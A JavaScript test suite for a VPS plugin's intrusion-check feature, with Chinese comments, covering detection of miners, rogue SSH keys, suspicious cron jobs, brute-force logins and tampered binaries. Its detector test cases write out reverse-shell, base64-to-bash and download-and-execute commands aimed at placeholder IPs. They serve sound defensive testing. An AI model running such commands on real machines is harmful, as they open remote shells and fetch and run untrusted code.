// 状态页的「入侵排查」卡片：这台有没有被人控制（俗称肉鸡）
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { mkdtemp, readFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { Readable } from 'node:stream'
import { writeHosts } from '../lib/config.js'
import { withLang } from '../lib/i18n.js'
import {
  INTRUSION_SCRIPT, IOC_SCAN, ackIntrusion, baselineFrom, cronCommand, intrusionText, judgeIntrusion, parseIntrusion, readKnown, suspicious,
} from '../lib/intrusion.js'
import { STATUS_SCRIPT, judge, parseStatus } from '../lib/status.js'
import { registerRoutes } from '../lib/routes.js'
import { registerCommands } from '../lib/commands.js'

const HAN = /[\u4e00-\u9fff]/
// 2026-10-29 在 Ubuntu 24.04 容器里实跑完整排查脚本的输出：故意放了挖矿程序、临时目录里的程序、
// 冒充内核线程、已删还在跑的程序、陌生钥匙、第二个 root、从裸 IP 下载执行的定时任务、
// .bashrc 里的反弹 shell、被改过的系统命令（IP 换成了文档用的地址）
const UBUNTU = await readFile(new URL('./fixtures/intrusion-ubuntu.txt', import.meta.url), 'utf8')

const item = (j, id) => j.groups.flatMap((g) => g.items).find((i) => i.id.startsWith(id))
const group = (j, id) => j.groups.find((g) => g.id === id)

test('脚本：不能有 JS 插值和反引号；挖矿程序名不能原样写进去（awk 自己的命令行会被当成挖矿程序）；状态采集里也带着轻量检查', () => {
  for (const s of [INTRUSION_SCRIPT, IOC_SCAN]) {
    assert.ok(!s.includes('${'), '脚本里出现了美元符 + 左花括号')
    assert.ok(!s.includes('`'), '脚本里出现了反引号')
    assert.doesNotMatch(s, /xmrig|kdevtmpfsi|kinsing|stratum2?\\?\+tcp|--donate-level/, '挖矿程序名要写成 [x]mrig 这样')
  }
  assert.ok(STATUS_SCRIPT.includes(IOC_SCAN), '状态采集脚本里要有轻量检查')
  assert.match(INTRUSION_SCRIPT, /grep -v '\^missing'/, 'dpkg -V 里文档缺失的行要先去掉，不然挤掉真正被改的程序')
})

test('解析：容器里实跑的输出——进程、钥匙、定时任务、登录脚本、系统命令、黑名单都认得出来', () => {
  const d = parseIntrusion(UBUNTU)
  assert.equal(d.priv, 'root')
  assert.deepEqual(d.procs.map((p) => p.reason).sort(), ['deleted', 'kthread', 'miner', 'tmp'])
  assert.equal(d.procs.find((p) => p.reason === 'kthread').args, '[kworker/1:1] 300')
  assert.equal(d.keys.length, 2)
  assert.deepEqual(d.keys.map((k) => k.comment), ['dsh-vps-manager@mac', 'stranger@evil'])
  assert.equal(d.keys[0].type, 'ED25519')
  assert.deepEqual(d.uid0, ['tester'])
  assert.ok(d.cron.some((c) => c.file === '/var/spool/cron/crontabs/root' && c.line.includes('|sh')), '定时任务那一行里的 | 不能被切掉')
  assert.equal(d.sus.length, 1)
  assert.equal(d.sus[0].file, '/root/.bashrc')
  assert.equal(d.verify.tool, 'dpkg')
  assert.ok(d.verify.pkgs.includes('procps'))
  assert.deepEqual(d.verify.bad.filter((b) => b.flags[2] === '5').map((b) => b.path), ['/usr/bin/pinky'])
  assert.equal(d.ip, '203.0.113.7')
  assert.equal(d.blocklists.length, 3)
  assert.equal(d.logSource, 'none')
})

test('判断：容器里那几样都报红；插件自己的钥匙认得；第一次排查不把原本就有的定时任务当成「新增」', () => withLang('zh', () => {
  const d = parseIntrusion(UBUNTU)
  const j = judgeIntrusion(d, null)
  assert.equal(j.worst, 'danger')
  assert.equal(j.headline, '发现 7 处入侵迹象')
  assert.match(item(j, 'proc:').text, /PID/)
  assert.ok(group(j, 'procs').items.some((i) => i.text === '挖矿程序：kdevtmpfsi（PID 3350）'))
  assert.ok(group(j, 'procs').items.some((i) => /冒充系统内核线程：\[kworker\/1:1\] 300，实际是 \/usr\/local\/bin\/kw/.test(i.text)))
  assert.equal(group(j, 'procs').items.find((i) => /已被删掉/.test(i.text)).level, 'warn', '文件已删的只是黄')
  const keys = group(j, 'backdoor').items.filter((i) => i.id.startsWith('key:'))
  assert.equal(keys.length, 1, '插件放的钥匙（dsh-vps-manager@…）自动认得')
  assert.match(keys[0].text, /^root 有一把钥匙你还没确认：stranger@evil（ED25519，文件 \d+ 月 \d+ 日改过）$/)
  assert.deepEqual(keys[0].ack, { kind: 'keys', value: d.keys[1].fp })
  assert.match(item(j, 'uid0:').text, /UID 为 0 的账号：tester/)
  assert.match(item(j, 'cron:').text, /^定时任务：从裸 IP 地址下载脚本直接执行——/)
  assert.match(item(j, 'sus:').text, /^登录时自动执行的 \/root\/\.bashrc：反弹 shell/)
  assert.equal(item(j, 'bin:').level, 'danger')
  assert.equal(group(j, 'net').level, 'ok')
  assert.equal(group(j, 'logins').level, 'na')
  assert.equal(group(j, 'reputation').text, '不在被黑主机黑名单上（Spamhaus XBL、DroneBL、blocklist.de）')
  // 第一次排查以后：原本就有的定时任务、定时脚本、账号不报「新增」；可疑的照报
  const again = judgeIntrusion(d, baselineFrom(d))
  assert.equal(again.headline, j.headline)
  assert.ok(!again.groups.flatMap((g) => g.items).some((i) => /新增/.test(i.text)))
}))

test('判断：可疑写法只认几乎不会出现在正常配置里的；写日志到 /tmp、acme.sh 这类不算', () => {
  const cases = [
    ['bash -i >& /dev/tcp/1.2.3.4/4444 0>&1', 'revshell'],
    ['nc -e /bin/sh 1.2.3.4 4444', 'revshell'],
    ['echo ZWNobyBoaQ== | base64 -d | bash', 'b64'],
    ['/tmp/.x/kworker -B', 'tmpexec'],
    ['cd /tmp && ./run.sh', 'tmpexec'],
    ['wget -q -O /tmp/x http://e.example/x && chmod +x /tmp/x && /tmp/x', 'tmpexec'],
    ['(curl -fsSL http://1.2.3.4/x.sh||wget -q -O- http://1.2.3.4/x.sh)|sh', 'dlip'],
    ['curl -fsSL https://get.docker.com | sh', 'dl'],
    ['/usr/bin/apt-get -qq update > /tmp/apt.log 2>&1', null],
    ['"/root/.acme.sh"/acme.sh --cron --home "/root/.acme.sh" > /dev/null', null],
    ['test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )', null],
    ['rm -rf /tmp/cache/*', null],
    ['/usr/bin/certbot renew --quiet', null],
  ]
  for (const [cmd, kind] of cases) assert.equal(suspicious(cmd)?.kind ?? null, kind, cmd)
  assert.equal(suspicious('curl -fsSL https://get.docker.com | sh').level, 'warn', '从域名下载执行只是黄')
  assert.equal(cronCommand('/etc/crontab', '17 *\t* * *\troot\tcd / && run-parts --report /etc/cron.hourly'), 'cd / && run-parts --report /etc/cron.hourly')
  assert.equal(cronCommand('/var/spool/cron/crontabs/root', '@reboot /tmp/x'), '/tmp/x')
})

const empty = () => parseIntrusion('priv=root\nss=1\nvtool=dpkg\nvpkg=procps\nlogsrc=journal\nip=203.0.113.7\nbl=zen.spamhaus.org|\nbl=dnsbl.dronebl.org|\nbl=bl.blocklist.de|\nfail_total=0\nfail_ips=0')
const withLines = (...lines) => parseIntrusion(['priv=root', 'ss=1', 'vtool=dpkg', 'vpkg=procps', 'logsrc=journal', 'ip=203.0.113.7', 'bl=zen.spamhaus.org|', 'bl=dnsbl.dronebl.org|', 'bl=bl.blocklist.de|', ...lines].join('\n'))

test('判断：干净的机器全绿；对外连接按程序看——代理、tor 连再多也不算，别的程序扫描、爆破别人才报', () => withLang('zh', () => {
  const clean = judgeIntrusion(empty(), null)
  assert.equal(clean.worst, 'ok')
  assert.equal(clean.headline, '没发现入侵迹象')
  const j = judgeIntrusion(withLines(
    'conn=sing-box|800|120|30|2|5.6.7.8:3333',
    'conn=tor|200|40|0|0|',
    'conn=python3|60|45|0|0|',
    'conn=ssh|8|0|8|0|',
    'conn=perl|12|0|9|0|',
    'conn=node|30|0|0|1|9.9.9.9:14444',
  ), null)
  const net = group(j, 'net')
  assert.deepEqual(net.items.map((i) => i.id), ['scan:python3', 'brute:perl', 'pool:node'])
  assert.equal(net.items[0].text, 'python3 正在同时向 45 个地址发起连接：像在扫描别人')
  assert.equal(net.items[1].level, 'danger')
  assert.equal(net.items[2].level, 'warn', '只是连着矿池端口：黄')
  assert.match(net.detail, /sing-box 800 个地址/)
}))

test('判断：登录记录——先试错很多次再用密码登录成功是红；陌生 IP 用密码登录是黄、点「是我的」就不报；插件的钥匙登录没事', () => withLang('zh', () => {
  const d = withLines(
    'key=root|/root/.ssh/authorized_keys|1793328467|SHA256:plugin|256|dsh-vps-manager@mac (ED25519)',
    'login=publickey|root|198.51.100.2|SHA256:plugin|40|1793328467',
    'login=password|root|192.0.2.66|||3|1793328467',
    'login=password|admin|198.51.100.9||1|1793328467',
    'login=publickey|root|198.51.100.3|SHA256:gone|2|1793328467',
    'fail=192.0.2.66|5321',
    'fail_total=9000',
    'fail_ips=300',
  )
  const j = judgeIntrusion(d, { init: true, accts: [], keys: [], ips: [] })
  const logins = group(j, 'logins').items
  assert.equal(logins.find((i) => i.id.startsWith('brute:')).text, '192.0.2.66 先试错 5321 次密码，然后用 root 登录成功了：很可能是被爆破进来的')
  assert.equal(logins.find((i) => i.id.startsWith('pw:')).text, '用密码登录成功过：admin 来自 198.51.100.9（1 次）')
  assert.match(logins.find((i) => i.id.startsWith('lkey:')).text, /现在已经不在服务器上的钥匙/)
  assert.equal(logins.length, 3, '插件钥匙那 40 次不报')
  assert.match(group(j, 'logins').detail, /近 7 天登录失败 9000 次，来自 300 个 IP/)
  const acked = judgeIntrusion(d, { init: true, accts: [], keys: ['SHA256:gone'], ips: ['198.51.100.9', '192.0.2.66'] })
  assert.equal(group(acked, 'logins').level, 'ok')
}))

test('判断：第一次排查以后新增的定时任务、自启服务、账号、免密 sudo 报黄，点「是我加的」就不报；可疑的自启服务报红', () => withLang('zh', () => {
  const before = withLines('acct=root|0|/bin/bash', 'cron=/etc/cron.d/backup|0 3 * * * root /usr/local/bin/backup.sh', 'unit=app.service|ExecStart=/usr/local/bin/app;')
  const known = baselineFrom(before)
  const after = withLines(
    'acct=root|0|/bin/bash', 'acct=deploy|1001|/bin/bash',
    'cron=/etc/cron.d/backup|0 3 * * * root /usr/local/bin/backup.sh', 'cron=/etc/cron.d/new|*/10 * * * * root /usr/local/bin/report',
    'unit=app.service|ExecStart=/usr/local/bin/app;', 'unit=sysupd.service|ExecStart=/bin/sh -c "curl -s http://203.0.113.9/a | sh";',
    'sudo=/etc/sudoers.d/deploy:deploy ALL=(ALL) NOPASSWD:ALL',
    'susunit=/lib/systemd/system/dbus-x.service:ExecStart=/dev/shm/.d/x',
  )
  const j = judgeIntrusion(after, known)
  const back = group(j, 'backdoor').items
  assert.equal(back.find((i) => i.id.startsWith('acct:')).text, '上次排查以后新增了能登录的账号：deploy')
  assert.equal(back.find((i) => /新增的定时任务/.test(i.text)).text, '上次排查以后新增的定时任务：/usr/local/bin/report')
  assert.equal(back.find((i) => /sysupd/.test(i.text)).level, 'danger')
  assert.match(back.find((i) => /dbus-x/.test(i.text)).text, /执行临时目录里的程序/)
  assert.match(back.find((i) => i.id.startsWith('sudo:')).text, /新增的免密 sudo/)
  assert.equal(back.filter((i) => /backup|app\.service/.test(i.text)).length, 0, '原本就有的不报')
  // 全部点掉
  const all = { ...known }
  for (const i of back) all[i.ack.kind] = [...(all[i.ack.kind] ?? []), i.ack.value]
  assert.equal(group(judgeIntrusion(after, all), 'backdoor').level, 'ok')
}))

test('判断：系统命令——配置文件改过不算；程序被改是红，别的文件是黄', () => withLang('zh', () => {
  const j = judgeIntrusion(withLines(
    'vbad=sudo|??5?????? c /etc/sudoers',
    'vbad=procps|??5??????   /usr/bin/ps',
    'vbad=libpam-modules|??5??????   /usr/lib/x86_64-linux-gnu/security/pam_unix.so',
    'vbad=procps|??5??????   /usr/share/doc/procps/x',
    'vbad=procps|missing     /usr/share/man/man1/ps.1.gz',
  ), null)
  const b = group(j, 'binaries').items
  assert.deepEqual(b.map((i) => [i.id, i.level]), [['bin:/usr/bin/ps', 'danger'], ['bin:/usr/lib/x86_64-linux-gnu/security/pam_unix.so', 'danger'], ['bin:/usr/share/doc/procps/x', 'warn']])
  assert.equal(group(judgeIntrusion(empty(), null), 'binaries').text, '核对了 1 个关键软件包（ps、ss、ls、sshd 等），没有被替换')
  assert.equal(group(judgeIntrusion(parseIntrusion('vtool=none'), null), 'binaries').level, 'na')
}))

test('判断：IP 名声——XBL、blocklist.de 红；DroneBL 按类别；PBL 不算；DNS 被名单拒绝是「查不了」', () => withLang('zh', () => {
  const rep = (...bl) => group(judgeIntrusion(parseIntrusion(['priv=root', 'ip=203.0.113.7', ...bl.map((b) => `bl=${b}`)].join('\n')), null), 'reputation')
  assert.equal(rep('zen.spamhaus.org|127.0.0.4', 'dnsbl.dronebl.org|', 'bl.blocklist.de|').items[0].level, 'danger')
  assert.match(rep('zen.spamhaus.org|127.0.0.4', 'dnsbl.dronebl.org|', 'bl.blocklist.de|').detail, /上一任用户/)
  assert.equal(rep('zen.spamhaus.org|127.0.0.10', 'dnsbl.dronebl.org|', 'bl.blocklist.de|').level, 'ok', 'PBL 只是住宅 IP 名单')
  assert.equal(rep('zen.spamhaus.org|', 'dnsbl.dronebl.org|127.0.0.9', 'bl.blocklist.de|').items[0].text, '上了 DroneBL：被记为「开放的 HTTP 代理」')
  assert.equal(rep('zen.spamhaus.org|', 'dnsbl.dronebl.org|', 'bl.blocklist.de|127.0.0.2').items[0].level, 'danger')
  assert.equal(rep('zen.spamhaus.org|127.255.255.254', 'dnsbl.dronebl.org|127.255.255.254', 'bl.blocklist.de|127.255.255.254').level, 'na')
  assert.equal(rep('zen.spamhaus.org|127.255.255.254', 'dnsbl.dronebl.org|', 'bl.blocklist.de|').text, '不在被黑主机黑名单上（DroneBL、blocklist.de；1 个名单这次查不了）', '查不了的不能算「不在上面」')
  assert.equal(rep('zen.spamhaus.org|::ffff:127.0.0.4', 'dnsbl.dronebl.org|', 'bl.blocklist.de|').level, 'danger', 'IPv6 映射的写法也认')
}))

test('判断：常见入口——Docker 2375、没密码的 Redis 对外开放报黄；只在本机或设了密码不报', () => withLang('zh', () => {
  const entry = (...l) => group(judgeIntrusion(withLines(...l), null), 'entry')
  assert.equal(entry('listen=0.0.0.0:2375|dockerd').items[0].id, 'docker')
  assert.match(entry('listen=0.0.0.0:6379|redis-server', 'redis_ping=PONG').items[0].text, /没设密码/)
  assert.equal(entry('listen=0.0.0.0:6379|redis-server', 'redis_ping=NOAUTH Authentication required.').level, 'ok')
  assert.equal(entry('listen=127.0.0.1:6379|redis-server', 'redis_ping=PONG').level, 'ok')
}))

test('判断：连不上服务器时每组都说没查；英文结论没有汉字', async () => {
  const j = withLang('zh', () => judgeIntrusion({ sshFailed: '连接超时' }, null))
  assert.equal(j.worst, 'na')
  assert.ok(j.groups.every((g) => g.level === 'na' && /连不上服务器/.test(g.text)))
  const en = withLang('en', () => judgeIntrusion(parseIntrusion(UBUNTU), null))
  const texts = [en.headline, ...en.groups.flatMap((g) => [g.title, g.text, g.detail ?? '', ...g.items.map((i) => i.text)])]
  for (const x of texts) assert.doesNotMatch(x, HAN, x)
  assert.equal(en.headline, '7 signs of intrusion found')
})

test('轻量检查：状态采集里的可疑进程和 ld.so.preload 进「需注意」；ld.so.preload 在入侵排查里点过「是我加的」就不报', async () => {
  const { hash } = await import('../lib/intrusion.js')
  const s = parseStatus('priv=root\nioc=miner|991|/tmp/kdevtmpfsi|/tmp/kdevtmpfsi\nioc=deleted|992|/opt2/app (deleted)|app\npreload=/usr/lib/libjemalloc.so.2')
  const j = judge(s)
  const hits = j.attention.filter((i) => i.area === 'intrusion')
  assert.deepEqual(hits.map((i) => [i.type, i.level]), [['ioc', 'danger'], ['preload', 'danger'], ['ioc', 'warn']])
  const known = { sus: [hash('preload\n/usr/lib/libjemalloc.so.2')] }
  assert.ok(!judge(s, Date.now(), { known }).attention.some((i) => i.type === 'preload'))
  assert.equal(judge(parseStatus('priv=root')).attention.filter((i) => i.area === 'intrusion').length, 0)
})

// —— 接口与命令 ——

async function sandbox(output = UBUNTU) {
  const home = await mkdtemp(join(tmpdir(), 'dsh-vps-intr-'))
  const env = { HOME: home, DSH_HOME: join(home, '.dsh') }
  await writeHosts({ current: 'la', hosts: { la: {} } }, env)
  let ssh = 0
  const runner = (_a, payload) => {
    ssh += 1
    const nonce = /__DSH_BEGIN_([0-9a-f]+)__/.exec(payload)[1]
    return Promise.resolve({ stdout: `__DSH_BEGIN_${nonce}__\n${output}\n__DSH_RC_${nonce}__=0\n`, stderr: '', exitCode: 0, durationMs: 5 })
  }
  return { env, deps: { env, runner }, ssh: () => ssh }
}

test('接口：排查一次存本机、第一次记下基线；两边同时点只查一次；「是我的」只改本机；读的时候按界面语言现拼', async () => {
  const { env, deps, ssh } = await sandbox()
  const exact = new Map()
  const ws = { config: { host: '127.0.0.1', port: 3000 }, register({ path, handler }) { exact.set(path, handler); return () => exact.delete(path) } }
  const reg = registerRoutes({ webServer: ws }, deps)
  const call = async (path, body, lang = 'zh') => {
    const req = Readable.from([Buffer.from(JSON.stringify(body))])
    req.method = 'POST'
    req.headers = { 'content-type': 'application/json', host: '127.0.0.1:3000', 'x-dsh-vps-token': reg.token, 'x-dsh-vps-lang': lang }
    req.socket = { remoteAddress: '127.0.0.1' }
    const out = {}
    await exact.get(`/api-vps/${path}`)(req, { writeHead: (c) => { out.code = c }, end: (t) => { out.body = JSON.parse(t) } })
    return out.body
  }
  assert.equal((await call('status/intrusion/get', { alias: 'la' })).intrusion, null, '没排查过就是空的')
  const [a, b] = await Promise.all([call('status/intrusion/check', { alias: 'la' }), call('status/intrusion/check', { alias: 'la' })])
  assert.equal(ssh(), 1, '同一台同时只跑一次')
  assert.equal(a.intrusion.headline, b.intrusion.headline)
  assert.equal(a.intrusion.headline, '发现 7 处入侵迹象')
  const known = await readKnown('la', env)
  assert.equal(known.init, true)
  assert.ok(known.cron.length >= 6, '原本就有的定时任务记成了基线')
  assert.deepEqual(known.keys, [], '钥匙要用户自己确认')
  const key = a.intrusion.groups.flatMap((g) => g.items).find((i) => i.ack?.kind === 'keys')
  const acked = await call('status/intrusion/ack', { alias: 'la', kind: 'keys', value: key.ack.value })
  assert.ok(!acked.intrusion.groups.flatMap((g) => g.items).some((i) => i.ack?.kind === 'keys'), '点了就不再报')
  assert.equal(ssh(), 1, '「是我的」不连服务器')
  const bad = await call('status/intrusion/ack', { alias: 'la', kind: 'nope', value: 'x' })
  assert.equal(bad.ok, false)
  const en = await call('status/intrusion/get', { alias: 'la' }, 'en')
  assert.equal(en.intrusion.headline, '7 signs of intrusion found', '钥匙只是黄，点掉以后红的还是 7 处')
  assert.ok(!en.intrusion.headline.includes('to confirm'))
  await assert.rejects(ackIntrusion({ alias: 'la', kind: 'keys', value: '', env }), /内容不对|Invalid value/)
})

test('命令：/vps-intrusion 一组一行，有问题的项缩进列在下面；在 /vps-help 的「看信息」里', async () => {
  const { deps } = await sandbox()
  const cmds = new Map()
  registerCommands({ commands: { register: (c) => { cmds.set(c.name, c); return () => {} } } }, deps)
  const out = await withLang('zh', () => cmds.get('vps-intrusion').handler({ rawInput: '-h la' }))
  assert.equal(out.kind, 'success', out.text)
  assert.match(out.text, /^\[la\] 入侵排查 · \d\d:\d\d · 发现 7 处入侵迹象\n/)
  assert.match(out.text, /\n✗ 可疑进程：4 项\n {4}✗ /)
  assert.match(out.text, /\n✓ 对外连接：没有扫描、爆破别人或连矿池/)
  assert.match(out.text, /内核级的 rootkit/)
  const help = await withLang('zh', () => cmds.get('vps-help').handler({}))
  assert.match(help.text, /\/vps-intrusion\s+(入侵排查|Compromise check)/)
  const text = withLang('en', () => intrusionText('la', { checkedAt: new Date().toISOString() }, judgeIntrusion(parseIntrusion(UBUNTU), null)))
  assert.doesNotMatch(text, HAN)
})
